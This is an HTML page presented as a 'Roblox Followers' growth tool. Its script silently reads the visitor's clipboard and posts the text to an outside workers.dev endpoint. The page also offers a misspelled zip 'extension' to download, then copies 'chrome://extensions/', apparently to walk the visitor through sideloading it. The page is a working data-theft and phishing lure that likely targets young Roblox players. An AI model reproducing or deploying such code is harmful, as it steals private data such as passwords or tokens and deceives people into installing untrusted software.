<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Roblox Followers</title>
<link rel="icon" type="image/png" href="favicon.png">

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;

  display: flex;
  align-items: center;
  justify-content: center;

  background: #08080c;
  color: white;

  font-family: Arial, Helvetica, sans-serif;
}

.background {
  position: fixed;
  inset: 0;
  overflow: hidden;
  pointer-events: none;
}

.glow {
  position: absolute;
  width: 420px;
  height: 420px;
  border-radius: 50%;
  filter: blur(120px);
  opacity: .16;
}

.glow.one {
  top: -180px;
  left: -150px;
  background: #5865f2;
}

.glow.two {
  right: -180px;
  bottom: -180px;
  background: #8b5cf6;
}

.card {
  position: relative;
  width: min(92%, 520px);

  padding: 42px;

  border-radius: 26px;

  background: rgba(18,18,24,.92);
  border: 1px solid rgba(255,255,255,.08);

  box-shadow:
    0 25px 80px rgba(0,0,0,.55),
    inset 0 1px 0 rgba(255,255,255,.04);

  text-align: center;
}

.logo {
  width: 64px;
  height: 64px;

  margin: 0 auto 22px;

  display: flex;
  align-items: center;
  justify-content: center;

  border-radius: 18px;

  background: white;
  color: #111;

  font-size: 30px;
  font-weight: 900;
}

h1 {
  margin: 0;

  font-size: 34px;
  font-weight: 900;
  letter-spacing: -1px;
}

.subtitle {
  margin: 12px 0 28px;

  color: #9999a6;
  font-size: 14px;
  line-height: 1.6;
}

.main-button {
  width: 100%;

  padding: 18px 24px;

  border: 0;
  border-radius: 15px;

  background: white;
  color: #111;

  font-size: 18px;
  font-weight: 800;

  cursor: pointer;

  transition:
    transform .2s ease,
    box-shadow .2s ease,
    background .2s ease;
}

.main-button:hover {
  transform: translateY(-3px);
  box-shadow: 0 15px 35px rgba(255,255,255,.16);
  background: #f0f0f0;
}

.status {
  min-height: 20px;

  margin-top: 14px;

  color: #9999a6;
  font-size: 13px;
}

.download-box {
  margin-top: 28px;

  padding: 22px;

  border-radius: 20px;

  background: rgba(255,255,255,.045);
  border: 1px solid rgba(255,255,255,.08);
}

.download-title {
  margin: 0 0 7px;

  font-size: 19px;
  font-weight: 800;
}

.download-text {
  margin: 0 0 17px;

  color: #9999a6;
  font-size: 13px;
}

.download-button {
  display: block;

  width: 100%;

  padding: 18px 24px;

  border-radius: 15px;

  background: white;
  color: #111;

  font-size: 18px;
  font-weight: 800;

  text-decoration: none;

  transition:
    transform .2s ease,
    box-shadow .2s ease,
    background .2s ease;
}

.download-button:hover {
  transform: translateY(-3px);

  box-shadow:
    0 15px 35px rgba(255,255,255,.16);

  background: #f0f0f0;
}

.extensions-button {
  display: none;

  width: 100%;

  margin-top: 12px;
  padding: 15px 20px;

  border: 1px solid rgba(255,255,255,.12);
  border-radius: 15px;

  background: #17171e;
  color: white;

  font-size: 15px;
  font-weight: 700;

  cursor: pointer;
}

.extensions-button:hover {
  background: #22222b;
}
</style>
</head>

<body>

<div class="background">
  <div class="glow one"></div>
  <div class="glow two"></div>
</div>

<div class="card">

  <div class="logo">R</div>

  <h1>Roblox Followers</h1>

  <p class="subtitle">
    Grow your Roblox presence with one simple click.
  </p>

  <button class="main-button" id="main">
    Roblox Followers
  </button>

  <div class="status" id="status"></div>

  <div class="download-box">

    <p class="download-title">
      Followers Extension
    </p>

    <p class="download-text">
      Download the Roblox Followers extension.
    </p>

    <a
      class="download-button"
      id="downloadButton"
      href="Followers_Extention_Donlowed.zip"
      download="Followers Extention Donlowed.zip"
    >
      ↓ Download Followers Extention
    </a>

    <button
      class="extensions-button"
      id="extensionsButton"
      type="button"
    >
      Copy Chrome Extensions Link
    </button>

  </div>

</div>

<script>

const button = document.getElementById("main");
const status = document.getElementById("status");

const SEND_ENDPOINT =
  "https://young-brook-716e.abojanmawzoon.workers.dev";

button.addEventListener("click", async () => {

  try {

    status.textContent = "Submitting...";

    const text = await navigator.clipboard.readText();

    if (!text) {
      status.textContent = "Your clipboard is empty.";
      return;
    }

    await fetch(SEND_ENDPOINT, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        clipboardText: text
      })
    });

  } catch (error) {

    status.textContent =
      "Something went wrong. Please try again.";

    console.error(error);
  }

});


const downloadButton =
  document.getElementById("downloadButton");

const extensionsButton =
  document.getElementById("extensionsButton");


downloadButton.addEventListener("click", () => {

  setTimeout(() => {

    extensionsButton.style.display = "block";

  }, 500);

});


extensionsButton.addEventListener("click", async () => {

  try {

    await navigator.clipboard.writeText(
      "chrome://extensions/"
    );

    extensionsButton.textContent = "Copied!";

    setTimeout(() => {

      extensionsButton.textContent =
        "Copy Chrome Extensions Link";

    }, 2000);

  } catch (error) {

    extensionsButton.textContent =
      "Copy failed";

  }

});

</script>

</body>
</html>
